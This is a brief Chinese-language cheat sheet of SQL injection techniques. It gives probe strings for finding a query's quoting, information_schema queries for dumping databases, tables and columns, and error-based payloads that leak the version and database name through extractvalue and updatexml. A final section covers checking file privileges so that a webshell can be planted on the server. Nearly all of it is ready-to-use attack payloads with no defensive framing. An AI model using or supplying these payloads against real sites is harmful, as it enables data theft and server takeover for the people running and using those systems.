# 有关SQL注入
## 查看开发者使用哪种查询
1. ?id=1'--+
2. ?id=1--+
3. ?id=1')--+
4. ?id=1")--+
5. ?id=1"))-++

## 爆库,表,字段
### 猜数据库 
```sql
select schema_name from information_schema.schemata
```
### 猜某库的数据表
```sql
select table_name from information_schema.tables where table_schema=’xxxxx’ 
```
### 猜某表的所有列 
```sql
Select column_name from information_schema.columns where table_name=’xxxxx’ 
```
### 获取某列的内容 
```sql
Select *** from ****
```
## 基于报错的盲注

#### 基于xpath语法错误

```sql
?id=extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+
?id=updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+
?nid=12' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ 
//这里的concat的第二个参数就是查询语句
```

### 导入导出（传马）

1. 查看是否有读写权限

   ```sql
   and (select count(*) from mysql.user)>0--+ 
   如果结果返回正常,说明具有读写权限，否则无
   ```

2. 欲读取文件必须在服务器上，加个木马啥的
3. 必须指定文件完整的路径
4. 欲读取文件必须小于 max_allowed_packet